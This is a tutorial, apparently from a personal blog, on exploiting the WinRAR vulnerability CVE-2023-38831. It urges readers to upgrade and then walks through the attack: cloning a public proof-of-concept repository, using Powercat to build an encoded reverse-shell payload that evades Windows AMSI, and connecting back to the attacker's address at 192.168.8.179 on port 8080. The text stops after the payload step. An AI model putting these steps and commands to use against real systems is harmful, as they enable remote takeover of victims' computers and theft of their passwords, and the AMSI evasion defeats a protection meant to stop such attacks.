# Being hacked through winrar (CVE-2023-38831)

If you are using WinRAR versions prior to 6.23, which is the case for many users, it has a vulnerability which hackers can potentially exploit to compromise your computer. They could gain remote access or, depending on your privilege level, install keyloggers to monitor and steal sensitive information, including your social media and internet banking passwords. To safeguard your system, it is crucial to take immediate action. Upgrade to WinRAR version 6.24 as soon as possible. In the following demonstration, I will illustrate how this attack can be executed and provide guidance on steps to protect yourself.

## STEPS
### 1. POC Script

Numerous proof-of-concept (POC) scripts are readily available. You can clone this specific one by using the following command:
```
git clone https://github.com/HDCE-inc/CVE-2023-38831.git
```  

### 2. Beating Windows' Anti-malware Scan Interface
Due to Windows' Anti-malware Scan Interface (AMSI) that actively scans for the execution of potentially malicious PowerShell code, we must adopt a more sophisticated approach when crafting our reverse code. Traditional one-liners typically used in Capture The Flag (CTF) challenges may not succeed in this scenario. To circumvent AMSI, it is advisable to employ a tool like Powercat to generate an encrypted payload, which is more likely to deceive AMSI's detection mechanisms. Powercat is the implementation of netcat in powershell. Use the ``` -c ``` option to denote client and ``` -p ``` to designate a port. Use ``` -ge ``` to generate encoded payload. We will use powershell ``` -E ``` option to execute it. Finally we redirect the payload to a file ``` shell.txt ``` with linux ``` > ``` operator.

On your Kali box, run the command:
```
powercat -c 192.168.8.179 -p 8080 cmd.exe -ge > shell.txt
```
The above command means the reverse shell will connect back to my machine, IP ``` 192.168.8.179 ``` on port ``` 8080 ```.

